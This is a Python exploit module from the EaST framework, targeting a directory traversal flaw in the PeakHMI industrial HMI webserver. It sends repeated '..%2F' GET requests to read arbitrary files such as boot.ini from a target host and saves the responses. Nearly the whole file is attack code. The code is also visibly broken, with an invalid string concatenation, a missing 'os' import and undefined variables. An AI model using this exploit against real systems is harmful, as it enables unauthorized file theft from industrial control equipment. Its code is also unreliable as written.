#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution
import sys
import socket
import time

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_PeakHMI_Webserver_DirTrav"
INFO['DESCRIPTION'] = "PeakHMI Webserver Directory Traversal Vulnerability 0-day"
INFO['VENDOR'] = "http://www.hmisys.com/"
INFO["CVE Name"] = "0-day"
INFO["NOTES"] = """
PeakHMI is a full featured robust Human Machine Interface (HMI)
program designed with the engineering, operations and management
needs and wants at the forefront of development and product roadmap.
PeakHMI provides for native connections to many devices using
manufacture and open protocols. The native OPC server and client
allow for connections to devices using many other protocols.
The configuration program is designed to provide for creation
of projects without the need to use a scripting or programming
language. All 25+ graphic animation actions are configured without scripting.
The included scripting engine is a powerful tool for the manipulation
of data and to extend the operator interface.

The PeakHMI Webserver Server is vulnerable to local file disclosure
if any user login in the system.

Affected version <= 7.10.4.3
"""

INFO['CHANGELOG'] = "18 Jan 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = '127.0.0.1'
OPTIONS["PORT"] = '80'
OPTIONS["FILENAME"] = "boot.ini"

class exploit(Sploit):
    def __init__(self, host="127.0.0.1", port=80,
        file_name="boot.ini",
            logger = None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.filename = file_name
        self.protocol = "http"
        self.state = "running"
        return

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.filename = self.args.get('FILENAME', 'boot.ini')
        self.protocol = "http"
        return

    def MakePath(self,f, count):
        a = ""
        for i in xrange(0, count):
            a = a + "..%2F"
        return a + f

    def sendGET(self):
        allData = ""
        flag = 0
        for i in xrange(0, 32):
            pkt = "GET http://"+self.host+":"+str(self.port)
            pkt += +"/" + self.MakePath(self.filename,i)
            pkt += " HTTP/1.1\r\nHost: "+self.host+":"+str(self.port)+"\r\n\r\n"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, int(self.port)))
                s.send(pkt)
                allData = s.recv(1000)
                s.close()
                if allData.lower().find("no such file or directory") > -1: continue
                if allData.lower().find("forbidden") > -1: continue
                if allData.lower().find("http-equiv") > -1: continue
                flag=1
                print('Found ' + self.query)
                self.log("Found file: " + request)
                break
            except:
                print('Not found')
        if flag:
            #writing the response   
            dirname= "report/"+self.name
            filename= "response_"+time.strftime("%b_%d_%Y_%H-%M-%S", time.gmtime())+".data"
            self.writefile(dirname, filename, allData)
            self.log("response received. check output  files in %s for valuable info"%(dirname))
            return 1
        return 0

    def writefile(self,dirname,filename,filedata):
        if not os.path.exists(dirname):
            os.makedirs(dirname)
        filepath=dirname+"/"+filename
        fd=file(filepath,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%filepath)
        return 1

    def run(self):
        self.args()
        self.log('Try download file: {}'.format(self.filename))
        if self.sendGET():
            self.finish(1)
        else:
            self.finish(0)


if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
